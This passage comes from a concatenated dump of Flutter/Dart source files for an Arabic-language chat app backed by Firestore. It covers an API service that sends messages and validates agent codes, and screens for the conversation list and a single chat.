      _logger.info("ApiService:createOrGetConversation",
          "Successfully created new conversation with ID: ${docRef.id}");
      return docRef.id;
    } catch (e, stackTrace) {
      _logger.error("ApiService:createOrGetConversation",
          "Failed to create new conversation in Firestore", e, stackTrace);
      return null;
    }
  }

  Future<void> sendMessage(
      String conversationId, ChatMessage messageToSend) async {
    _logger.info("ApiService:sendMessage",
        "Sending message to conversation $conversationId by agent $_currentAgentCode. Text: ${messageToSend.text ?? messageToSend.fileName ?? 'Attachment'}");

    if (conversationId.isEmpty || messageToSend.senderId != _currentAgentCode) {
      _logger.error("ApiService:sendMessage",
          "Invalid params: convId empty or senderId mismatch. ConvId: '$conversationId', Sender: '${messageToSend.senderId}', CurrentUser: '$_currentAgentCode'");
      return;
    }

    try {
      final messageData = messageToSend.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp(); // Use server timestamp for messages

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      _logger.debug("ApiService:sendMessage",
          "Message document ${messageDocRef.id} added to conversation $conversationId.");

      // When a message is sent, ensure the conversation is not marked as deleted for any participant.
      // This effectively "un-deletes" the conversation for all participants if they send a message.
      Map<String, dynamic> updateData = {
        "lastMessageText":
            messageToSend.text ?? (messageToSend.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": messageToSend.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {} // Clear all soft-delete flags for all users in this conversation
      };

      await _firestore.collection("conversations").doc(conversationId).update(updateData);
      _logger.info("ApiService:sendMessage",
          "Conversation $conversationId metadata updated and un-deleted for all participants.");
    } catch (e, stackTrace) {
      _logger.error(
          "ApiService:sendMessage",
          "Failed to send message to conversation $conversationId or update conversation metadata",
          e,
          stackTrace);
      rethrow;
    }
  }

  Future<bool> validateAgentCodeAgainstFirestore(
      String agentCodeToValidate) async {
    if (agentCodeToValidate.isEmpty) {
      _logger.warn("ApiService:validateAgentCode",
          "Attempted to validate an empty agent code.");
      return false;
    }
    _logger.info("ApiService:validateAgentCode",
        "Validating agent code: $agentCodeToValidate against 'agent_identities'");
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToValidate)
          .get();

      if (doc.exists) {
        _logger.info("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is VALID (document exists).");
        return true;
      } else {
        _logger.warn("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is INVALID (document does not exist).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "ApiService:validateAgentCode",
          "Error occurred while validating agent code '$agentCodeToValidate'",
          e,
          s);
      return false;
    }
  }
}




// ------------------------------ نهاية الملف: api_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_list_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_list_screen.dart
import "dart:async"; // For unawaited

import "package:cloud_firestore/cloud_firestore.dart"; 
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";

import "../../core/logging/logger_provider.dart";
// Import the whole file, as both ChatConversation and ChatParticipantInfo are used.
import "../../data/models/chat/chat_conversation.dart"; 
import "chat_screen.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/chat_list_item.dart";

final chatSearchQueryProvider = StateProvider<String>((ref) => "");

class ChatListScreen extends ConsumerStatefulWidget {
  const ChatListScreen({super.key});
  @override
  ConsumerState<ChatListScreen> createState() => _ChatListScreenState();
}

class _ChatListScreenState extends ConsumerState<ChatListScreen> {
  bool _isSearching = false;
  final TextEditingController _searchController = TextEditingController();
  bool _isFirstLoad = true; // Track first load to improve UX

  @override
  void initState() {
    super.initState();
    _searchController.addListener(() {
      if (mounted) {
        ref.read(chatSearchQueryProvider.notifier).state =
            _searchController.text;
      }
    });
    
    // Add a slight delay to make sure we've completed initialization
    Future.delayed(const Duration(milliseconds: 200), () {
      if (mounted) {
        setState(() {
          _isFirstLoad = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  void _toggleSearch() {
    setState(() {
      _isSearching = !_isSearching;
      if (!_isSearching) {
        _searchController.clear();
        ref.read(chatSearchQueryProvider.notifier).state = "";
      }
    });
  }

  Future<ChatParticipantInfo?> _fetchAgentInfo(
      String agentCode, WidgetRef ref) async {
    final logger = ref.read(appLoggerProvider);
    final firestore = FirebaseFirestore.instance;
    logger.info("_fetchAgentInfo",
        "Fetching info for agent: $agentCode (direct Firestore access)");
    if (agentCode.isEmpty) return null;
    try {
      final doc =
          await firestore.collection("agent_identities").doc(agentCode).get();
      if (doc.exists) {
        final data = doc.data()!;
        return ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );
      }
      logger.warn("_fetchAgentInfo", "Agent info not found for $agentCode.");
      return null;
    } catch (e, s) {
      logger.error(
          "_fetchAgentInfo", "Error fetching agent info for $agentCode", e, s);
      return null;
    }
  }

  void _createNewConversation() async {
    final apiService = ref.read(apiServiceProvider);
    final logger = ref.read(appLoggerProvider);
    final currentAgentCode =
        ref.read(currentAgentCodeProvider).value;
    final bool mainContextMounted = mounted; // Capture mounted state
    final theme = Theme.of(context); // Get theme for styling

    if (apiService == null ||
        currentAgentCode == null ||
        currentAgentCode.isEmpty) {
      logger.warn("ChatListScreen:createNewConversation",
          "ApiService or currentAgentCode is not available.");
      if (mainContextMounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("الخدمة غير متاحة أو لم يتم تسجيل الدخول.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    String? otherAgentCode = await showDialog<String>(
        context: context, 
        barrierDismissible: false, // Make dialog harder to dismiss accidentally
        builder: (dialogContext) {
          TextEditingController agentCodeController = TextEditingController();
          return AlertDialog(
            title: Text("بدء محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            content: Column(
              mainAxisSize: MainAxisSize.min, // Important for Column in AlertDialog
              children: [
                Text("الرجاء إدخال الرمز التعريفي للشخص الذي ترغب في بدء محادثة معه.", style: GoogleFonts.cairo(fontSize: 14)),
                const SizedBox(height: 15),
                TextField(
                  controller: agentCodeController,
                  decoration: InputDecoration(
                      hintText: "الرمز التعريفي للعميل الآخر",
                      hintStyle: GoogleFonts.cairo(),
                      border: const OutlineInputBorder(), // Add border for better visibility
                      prefixIcon: const Icon(Icons.person_search_outlined)
                  ),
                  style: GoogleFonts.cairo(),
                  autofocus: true, // Focus on the text field immediately
                ),
              ],
            ),
            actionsAlignment: MainAxisAlignment.spaceBetween, // Space out buttons
            actionsPadding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
            actions: [
              TextButton(
                  onPressed: () => Navigator.of(dialogContext).pop(),
                  child: Text("إلغاء", style: GoogleFonts.cairo(color: theme.colorScheme.error, fontWeight: FontWeight.bold))),
              ElevatedButton.icon(
                  icon: const Icon(Icons.send_outlined),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: theme.primaryColor,
                    foregroundColor: theme.colorScheme.onPrimary,
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12)
                  ),
                  onPressed: () {
                    final code = agentCodeController.text.trim();
                    if (code.isNotEmpty) {
                       Navigator.of(dialogContext).pop(code);
                    } else {
                      // Optionally show a small validation message within the dialog
                      ScaffoldMessenger.of(dialogContext).showSnackBar(
                        SnackBar(content: Text("الرجاء إدخال الرمز التعريفي.", style: GoogleFonts.cairo()), duration: const Duration(seconds: 2))
                      );
                    }
                  },
                  label: Text("بدء المحادثة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)))
            ],
          );
        });

    if (otherAgentCode == null || otherAgentCode.isEmpty) {
      logger.info("ChatListScreen:createNewConversation",
          "Dialog cancelled or no other agent code entered.");
      return;
    }

    if (otherAgentCode == currentAgentCode) {
      logger.info("ChatListScreen:createNewConversation",
          "Attempted to create chat with self.");
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لا يمكنك إنشاء محادثة مع نفسك بهذه الطريقة.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    // تحسين تجربة المستخدم بإظهار حالة تحميل مباشرة
    if (mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return Dialog(
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: theme.primaryColor),
                  const SizedBox(width: 20),
                  Text("جاري إعداد المحادثة...", style: GoogleFonts.cairo()),
                ],
              ),
            ),
          );
        },
      );
    }

    try {
      final otherAgentInfo = await _fetchAgentInfo(otherAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (otherAgentInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:createNewConversation",
            "Agent $otherAgentCode not found or error fetching info.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لم يتم العثور على عميل بالرمز: $otherAgentCode",
                  style: GoogleFonts.cairo())),
        );
        return;
      }

      final currentUserInfo = await _fetchAgentInfo(currentAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (currentUserInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:CreateNewConversation",
            "Failed to fetch current user ($currentAgentCode) info. This should not happen if login was successful.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ في جلب معلومات المستخدم الحالي.",
                style: GoogleFonts.cairo())
          )
        );
        return;
      }

      final Map<String, ChatParticipantInfo> participantsInfoMap = {
        currentAgentCode: currentUserInfo,
        otherAgentCode: otherAgentInfo,
      };

      final newConversationId =
          await apiService.createOrGetConversationWithParticipants(
        [otherAgentCode],
        participantsInfoMap,
      );
      
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;
      Navigator.of(context).pop(); // إغلاق نافذة التحميل

      if (newConversationId != null) {
        logger.info("ChatListScreen",
            "Successfully created/retrieved conversation: $newConversationId");
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => ChatScreen(
              conversationId: newConversationId,
              conversationTitle: otherAgentInfo.displayName,
            ),
          ),
        );
      } else {
        logger.warn("ChatListScreen",
            "Failed to create/retrieve conversation with $otherAgentCode.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text(
                  "فشل إنشاء/جلب المحادثة. قد تكون المشكلة في الاتصال أو البيانات.",
                  style: GoogleFonts.cairo())),
        );
      }
    } catch (e, stackTrace) {
      if (mounted) Navigator.of(context).pop(); // إغلاق نافذة التحميل عند حدوث خطأ
      logger.error("ChatListScreen:createNewConversation",
          "Error during conversation creation/retrieval", e, stackTrace);
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content:
                  Text("حدث خطأ: ${e.toString()}", style: GoogleFonts.cairo())),
        );
      }
    }
  }

  // دالة لعرض المحتوى المناسب عند عدم وجود محادثات
  Widget _buildEmptyConversationsView(BuildContext context) {
    final theme = Theme.of(context);
    
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.chat_bubble_outline_rounded, 
              size: 80, 
              color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد محادثات حتى الآن",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "يمكنك بدء محادثة جديدة مع أي شخص باستخدام الزر أدناه",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            icon: const Icon(Icons.add_comment_outlined),
            label: Text("بدء محادثة جديدة", 
                       style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            onPressed: _createNewConversation,
            style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: theme.colorScheme.onPrimary,
                padding: const EdgeInsets.symmetric(
                    horizontal: 24, vertical: 12),
                textStyle: GoogleFonts.cairo(fontSize: 16, fontWeight: FontWeight.bold),
                elevation: 2,
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض نتيجة بحث فارغة
  Widget _buildEmptySearchResults(String query) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.search_off_rounded, 
               size: 80, 
               color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد نتائج بحث تطابق \"$query\"",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          Text(
            "حاول استخدام كلمات مفتاحية مختلفة",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final conversationsAsyncValue = ref.watch(chatConversationsStreamProvider);
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);
    final currentSearchQuery = ref.watch(chatSearchQueryProvider).toLowerCase();

    if (agentCodeAsync.isLoading) {
      return const Scaffold(
          body: Center(child: CircularProgressIndicator()));
    }
    if (agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      return Scaffold(
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل بيانات المصادقة.\nالرجاء المحاولة مرة أخرى لاحقًا."
                  : "الرجاء تسجيل الدخول للوصول إلى قسم الدردشات.",
              style: GoogleFonts.cairo(fontSize: 17, color: Colors.grey[700]),
              textAlign: TextAlign.center,
            ),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 8, 8), 
              child: Row(
                children: [
                  Expanded(
                    child: _isSearching
                        ? TextField(
                            controller: _searchController,
                            autofocus: true,
                            style: GoogleFonts.cairo(color: theme.textTheme.bodyLarge?.color ?? (theme.brightness == Brightness.dark ? Colors.white : Colors.black)),
                            decoration: InputDecoration(
                              hintText: "بحث في الدردشات...",
                              hintStyle: GoogleFonts.cairo(color: theme.hintColor),
                              border: InputBorder.none, 
                            ))
                        : Text("الدردشات", style: GoogleFonts.cairo(fontSize: 20, fontWeight: FontWeight.bold, color: theme.textTheme.titleLarge?.color)),
                  ),
                  IconButton(
                    icon: Icon(_isSearching ? Icons.close : Icons.search_outlined, color: theme.iconTheme.color),
                    tooltip: _isSearching ? "إغلاق البحث" : "بحث",
                    onPressed: _toggleSearch,
                  ),
                  if (!_isSearching)
                    IconButton(
                      icon: Icon(Icons.refresh_outlined, color: theme.iconTheme.color),
                      tooltip: "تحديث",
                      onPressed: () {
                        unawaited(ref.refresh(chatConversationsStreamProvider.future));
                        logger.info("ChatListScreen",
                            "Manually refreshed conversations stream.");
                        if (_isSearching) _toggleSearch();
                        _searchController.clear();
                      },
                    ),
                ],
              ),
            ),
            Expanded(
              child: conversationsAsyncValue.when(
                data: (conversations) {
                  final filteredConversations = currentSearchQuery.isEmpty
                      ? conversations
                      : conversations.where((conv) {
                          return conv.conversationTitle
                                  .toLowerCase()
                                  .contains(currentSearchQuery) ||
                              (conv.lastMessageText ?? "")
                                  .toLowerCase()
                                  .contains(currentSearchQuery);
                        }).toList();

                  // عرض رسالة فارغة مناسبة
                  if (filteredConversations.isEmpty) {
                    if (currentSearchQuery.isNotEmpty) {
                      return _buildEmptySearchResults(currentSearchQuery);
                    } else {
                      return _buildEmptyConversationsView(context);
                    }
                  }
                  
                  return ListView.separated(
                    padding: const EdgeInsets.symmetric(vertical: 8.0),
                    itemCount: filteredConversations.length,
                    itemBuilder: (context, index) {
                      final conversation = filteredConversations[index];
                      return ChatListItem(
                        conversation: conversation,
                        onTap: () {
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) => ChatScreen(
                                conversationId: conversation.id,
                                conversationTitle: conversation.conversationTitle,
                              ),
                            ),
                          );
                        },
                      );
                    },
                    separatorBuilder: (context, index) => Divider(
                      height: 0.5,
                      indent: 75,
                      endIndent: 15,
                      color: theme.brightness == Brightness.dark
                          ? Colors.grey[700]
                          : Colors.grey[300],
                    ),
                  );
                },
                loading: () => _isFirstLoad 
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          CircularProgressIndicator(color: theme.primaryColor),
                          const SizedBox(height: 16),
                          Text(
                            "جاري تحميل المحادثات...",
                            style: GoogleFonts.cairo(fontSize: 16, color: theme.primaryColor),
                          )
                        ],
                      ))
                  : const Center(child: CircularProgressIndicator()),
                error: (err, stack) {
                  logger.error(
                      "ChatListScreen:StreamBuilder", "Error in stream UI", err, stack);
                  return Center(
                      child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.error_outline_rounded, 
                             size: 60, 
                             color: Colors.red[300]),
                        const SizedBox(height: 16),
                        Text(
                          "حدث خطأ أثناء تحميل المحادثات",
                          style: GoogleFonts.cairo(
                              fontSize: 18, 
                              color: Colors.red[400],
                              fontWeight: FontWeight.w600),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "الرجاء المحاولة مرة أخرى لاحقًا",
                          style: GoogleFonts.cairo(color: Colors.grey[600], fontSize: 14),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton.icon(
                          onPressed: () => ref.refresh(chatConversationsStreamProvider),
                          icon: const Icon(Icons.refresh_rounded),
                          label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: theme.primaryColor,
                            foregroundColor: Colors.white,
                          ),
                        )
                      ],
                    ),
                  ));
                },
              ),
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _createNewConversation,
        backgroundColor: theme.primaryColor,
        foregroundColor: theme.colorScheme.onPrimary,
        tooltip: "بدء محادثة جديدة",
        icon: const Icon(Icons.add_comment_outlined),
        label: Text("محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
        elevation: 3,
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_list_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_screen.dart
import "package:file_picker/file_picker.dart";
import "package:flutter/material.dart";
import "package:flutter/services.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:mime/mime.dart"; // For looking up MIME types

import "../../core/logging/logger_provider.dart";
import "../../data/models/chat/chat_message.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/message_bubble.dart";
import "widgets/message_input_bar.dart";

class ChatScreen extends ConsumerStatefulWidget {
  final String conversationId;
  final String conversationTitle; 
  final bool showAppBar;

  const ChatScreen({
    super.key,
    required this.conversationId,
    required this.conversationTitle,
    this.showAppBar = true, 
  });

  @override
  ConsumerState<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends ConsumerState<ChatScreen> {
  bool _isInitializing = true;

  @override
  void initState() {
    super.initState();
    // تأخير قليل جداً لإظهار حالة تحميل أفضل
    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _isInitializing = false;
        });
      }
    });
  }

  MessageType _determineMessageTypeFromFile(PlatformFile file) {
    final mimeType = lookupMimeType(file.name, headerBytes: file.bytes?.take(1024).toList());
    final extension = file.extension?.toLowerCase();
    
    if (mimeType != null) {
        if (mimeType.startsWith("image/")) return MessageType.image;
        if (mimeType.startsWith("video/")) return MessageType.video;
        if (mimeType.startsWith("audio/")) return MessageType.audio;
    }
    // Fallback to extension if MIME type is generic or missing
    if (extension == null) {
      return MessageType.file; 
    }
    switch (extension) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
      case "bmp":
        return MessageType.image;
      case "mp4":
      case "mov":
      case "avi":
      case "mkv":
      case "webm":
        return MessageType.video;
      case "mp3":
      case "wav":
      case "aac":
      case "ogg":
      case "m4a":
        return MessageType.audio;
      default:
        return MessageType.file;
    }
  }

  void _onMessageLongPress(
      BuildContext context, ChatMessage message, WidgetRef ref) {
    final logger = ref.read(appLoggerProvider);
    final currentTheme = Theme.of(context);

    showModalBottomSheet(
        context: context,
        backgroundColor: currentTheme.bottomSheetTheme.modalBackgroundColor ??
            currentTheme.cardColor,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        builder: (ctx) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 10.0),
            child: Wrap(
              children: <Widget>[
                Center(
                  child: Container(
                    width: 40,
                    height: 5,
                    margin: const EdgeInsets.only(top: 8, bottom: 12),
                    decoration: BoxDecoration(
                        color: Colors.grey[400],
                        borderRadius: BorderRadius.circular(10)),
                  ),
                ),
                if (message.text != null && message.text!.isNotEmpty)
                  ListTile(
                    leading: Icon(Icons.copy_all_outlined,
                        color: currentTheme.colorScheme.primary),
                    title: Text("نسخ النص",
                        style: GoogleFonts.cairo(fontSize: 16)),
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: message.text!));
                      Navigator.of(ctx).pop();
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("تم نسخ النص إلى الحافظة",
                              style: GoogleFonts.cairo()),
                          behavior: SnackBarBehavior.floating, 
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                        ),
                      );
                      logger.info("ChatScreen:MessageMenu",
                          "Copied message text: ${message.id}");
                    },
                  ),
              ],
            ),
          );
        });
  }

  // دالة لعرض حالة تحميل محسنة
  Widget _buildLoadingState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          CircularProgressIndicator(color: theme.primaryColor),
          const SizedBox(height: 20),
          Text(
            "جاري إعداد المحادثة...",
            style: GoogleFonts.cairo(
              fontSize: 16,
              color: theme.primaryColor,
              fontWeight: FontWeight.w500
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض حالة الخطأ بشكل محسن
  Widget _buildErrorState(String errorMsg, WidgetRef ref) {
    final theme = Theme.of(context);
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.error_outline_rounded,
                color: Colors.red[300], size: 60),
            const SizedBox(height: 15),
            Text(
              "حدث خطأ أثناء تحميل المحادثة",
              style: GoogleFonts.cairo(
                  color: Colors.red[400], 
                  fontSize: 18,
                  fontWeight: FontWeight.w600),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            Text(
              errorMsg,
              style: GoogleFonts.cairo(
                  color: Colors.grey[600], fontSize: 14),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.refresh_rounded),
              label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
              onPressed: () => ref.invalidate(
                  chatMessagesStreamProvider(widget.conversationId)),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              ),
            )
          ],
        ),
      ),
    );
  }

  // دالة لعرض حالة الرسائل الفارغة
  Widget _buildEmptyMessagesState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.forum_outlined,
              size: 100,
              color: theme.colorScheme.primary.withOpacity(0.6)),
          const SizedBox(height: 20),
          Text(
            "ابدأ المحادثة!",
            style: GoogleFonts.cairo(
                fontSize: 22,
                color: theme.colorScheme.onSurface,
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "لا توجد رسائل في هذه المحادثة بعد\nأرسل أول رسالة للبدء",
            style: GoogleFonts.cairo(
                fontSize: 16, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 12),
          Icon(
            Icons.arrow_downward_rounded,
            color: theme.primaryColor.withOpacity(0.7),
            size: 32,
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final messagesAsyncValue =
        ref.watch(chatMessagesStreamProvider(widget.conversationId));
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);

    if (_isInitializing) {
      return Scaffold(
        appBar: widget.showAppBar 
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: _buildLoadingState(context),
      );
    }

    if (agentCodeAsync.isLoading ||
        agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      Widget bodyContent;
      if (agentCodeAsync.isLoading) {
        bodyContent = _buildLoadingState(context);
      } else {
        bodyContent = Center(
          child: Padding(
            padding: const EdgeInsets.all(20.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل معلومات المستخدم للدردشة."
                  : "الرجاء تسجيل الدخول لعرض الرسائل.",
              style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[600]),
              textAlign: TextAlign.center,
            ),
          ),
        );
      }
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: bodyContent,
      );
    }

    final currentAgentCode = agentCodeAsync.value!;

    return Scaffold(
      appBar: widget.showAppBar
          ? AppBar(
              title: Text(widget.conversationTitle, style: GoogleFonts.cairo()),
              backgroundColor: theme.appBarTheme.backgroundColor ??
                  theme.colorScheme.primary,
              elevation: theme.appBarTheme.elevation ?? 1.0,
              actions: [
                IconButton(
                  icon: const Icon(Icons.refresh_outlined),
                  tooltip: "تحديث الرسائل",
                  onPressed: () {
                    ref.invalidate(chatMessagesStreamProvider(widget.conversationId));
                    logger.info("ChatScreen",
                        "Manually refreshed messages for ${widget.conversationId}");
                  },
                ),
              ],
            )
          : null, 
      body: Column(
        children: [
          Expanded(
            child: messagesAsyncValue.when(
              data: (messages) {
                if (messages.isEmpty) {
                  return _buildEmptyMessagesState(context);
                }
                return ListView.builder(
                  reverse: true,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10.0, vertical: 15.0),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final message = messages[messages.length - 1 - index];
                    return GestureDetector(
                      onLongPress: () =>
                          _onMessageLongPress(context, message, ref),
                      child: MessageBubble(
                        message: message,
                      ),
                    );
                  },
                );
              },
              loading: () => _buildLoadingState(context),
              error: (err, stack) {
                logger.error("ChatScreen:StreamBuilder",
                    "Error UI msg for ${widget.conversationId}", err, stack);
                return _buildErrorState(
                    "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى", ref);
              },
            ),
          ),
          MessageInputBar(
            onSendPressed: (text) async {
              if (text.trim().isNotEmpty) {
                final apiService = ref.read(apiServiceProvider);
                if (apiService == null) {
                  logger.error("ChatScreen:onSendPressed",
                      "ApiService is null. Cannot send message.");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال الرسائل غير متاحة.",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.orangeAccent,
                    ));
                  }
                  return;
                }

                // عرض مؤشر الإرسال
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Row(
                      children: [
                        SizedBox(
                          width: 20, 
                          height: 20, 
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: Colors.white,
                          )
                        ),
                        const SizedBox(width: 12),
                        Text("جاري إرسال الرسالة...", style: GoogleFonts.cairo()),
                      ],
                    ),
                    duration: const Duration(seconds: 1),
                    backgroundColor: theme.primaryColor,
                  ));
                }

                final newMessage = ChatMessage(
                  id: "", 
                  senderId: currentAgentCode,
                  text: text,
                  messageType: MessageType.text,
                  timestamp:
                      DateTime.now(), 
                  isSentByCurrentUser:
                      true, 
                );
                try {
                  await apiService.sendMessage(widget.conversationId, newMessage);
                  logger.info("ChatScreen:onSendPressed",
                      "Sent text msg to ${widget.conversationId}");
                } catch (e, stackTrace) {
                  logger.error("ChatScreen:onSendPressed",
                      "Failed to send text msg", e, stackTrace);
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("فشل إرسال الرسالة، يرجى المحاولة مرة أخرى",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.redAccent,
                    ));
                  }
                }
              } else {
                logger.info("ChatScreen:onSendPressed",
                    "Attempted to send empty text message.");
              }
            },
